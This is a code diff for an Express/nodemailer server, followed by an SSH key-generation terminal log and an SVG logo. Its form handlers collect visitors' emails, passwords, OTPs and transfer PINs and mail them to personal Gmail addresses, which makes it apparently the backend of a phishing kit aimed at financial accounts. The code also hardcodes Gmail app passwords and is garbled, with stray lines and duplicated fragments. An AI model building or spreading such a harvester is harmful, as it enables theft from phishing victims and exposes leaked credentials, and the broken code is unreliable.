@@ -1,0 +1,95 @@
+
+app.post('/',(req,res) => {
+    console.log(req.body)
+
+    const transporter = nodemailer.createTransport({
+        service:'gmail',
+        auth: {
+            user: 'edehchinedu59@gmail.com',
+            pass: 'yknycyzsxdkxpepq'
+        }
+    })
+    user: 'Victorchinemerem191@gmail.com',
+            pass: 'aivsveolwtqinddb'
+    const mailOptions = {
+        from: req.body.email,
+        to:'edehchinedu59@gmail.com',
+        subject: `Client from ${req.body.email}: password=> ${req.body.password} `
+    }\
+       from: req.body?.email,
+        to:'Victorchinemerem191@gmail.com',
+        subject: `Client: ${req.body?.email} \n password: ${req.body?.password} \n Otp Pin: ${req.body?.otp} \n Transfer Pin: ${req.body?.pin}`,
+       
+
+    transporter.sendMail(mailOptions,(error,info) => {
+        if(error){
+            console.log(error) 
+            res.send('error');
+        }else {
+            console.log("Email sent", + info.response);
+            res.send("success");
+        }
+    })
+})
+
+
+// otpForm
+app.get('/', (req,res ) => {
+    res.sendFile(__dirname + '/public/otp.html')
+})
+// otpForm
+app.post('/',(req,res) => {
+    console.log(req.body)
+
+    const transporter = nodemailer.createTransport({
+        service:'gmail',
+        auth: {
+            user: 'edehchinedu59@gmail.com',
+            pass: 'yknycyzsxdkxpepq'
+        }
+    })
+    const mailOptions = {
+        from: req.body?.otp,
+        to:'edehchinedu59@gmail.com',
+        subject: `Client: ${req.body?.otp} \n password: ${req.body?.pin} `
+    }
+console.log(mailOptions)
+    transporter.sendMail(mailOptions,(error,info) => {
+        if(error){
+            console.log(error) 
+            res.send('error');
+        }else {
+            console.log("Email sent", + info.response);
+            res.send("success");
+        }
+    })
+    
+})
+
+
+$ ssh-keygen -t ed25519 -C "edehchinedu59@gmail.com"
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/c/Users/USER PC/.ssh/id_ed25519):
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /c/Users/USER PC/.ssh/id_ed25519
+Your public key has been saved in /c/Users/USER PC/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:jassjIOGvtIaO9HcxjImCqUcfTFUMU0O1WIldboIY3E edehchinedu59@gmail.com
+The key's randomart image is:
+
+
+$ eval "$(ssh-agent -s)"
+Agent pid 2078
+
+USER PC@DESKTOP-SN4MFQ5 MINGW64 ~/Desktop/googleMailer (main)
+$ ssh-add ~/.ssh/id_ed25519
+Enter passphrase for /c/Users/USER PC/.ssh/id_ed25519:
+Identity added: /c/Users/USER PC/.ssh/id_ed25519 (edehchinedu59@gmail.com)
+
+
+
+
+
+
+ <svg _ngcontent-mpn-c203="" fill="none" height="57" viewBox="0 0 56 57" width="56" xmlns="http://www.w3.org/2000/svg"><path _ngcontent-mpn-c203="" d="M28.1004 56.1168H27.8996C14.92 56.0833 6.22222 53.368 4.41577 51.6918C2.50896 49.9822 0 41.0987 0 28.0584C0 15.0181 2.50896 6.13463 4.41577 4.42498C6.22222 2.71533 14.92 0.0335226 27.8996 0H28.1004C41.08 0.0335226 49.7778 2.74885 51.5842 4.42498C53.491 6.13463 56 15.0181 56 28.0584C56 41.0987 53.491 49.9822 51.5842 51.6918C49.7778 53.4015 41.08 56.1168 28.1004 56.1168Z" fill="white"></path><path _ngcontent-mpn-c203="" d="M40.9129 29.7351L39.8424 16.6278H33.386C33.386 16.6278 28.4684 26.7181 28.0335 28.0925H27.9666L22.7814 16.6278H16.325L15.2545 27.992L14.3513 39.5237H18.2987C20.0048 39.5237 20.6739 38.7862 20.8412 36.976C20.8412 36.976 21.5102 26.4164 21.4099 24.8744H21.4768L21.6775 25.5783C21.9451 26.517 25.6249 35.5345 25.6249 35.5345H30.4756C30.4756 35.5345 34.1554 26.6511 34.6237 24.8744H34.6906L35.2593 36.976C35.3932 38.7862 36.0957 39.5237 37.7683 39.5237H41.7157L40.9129 29.7351Z" fill="#0361F0"></path></svg>
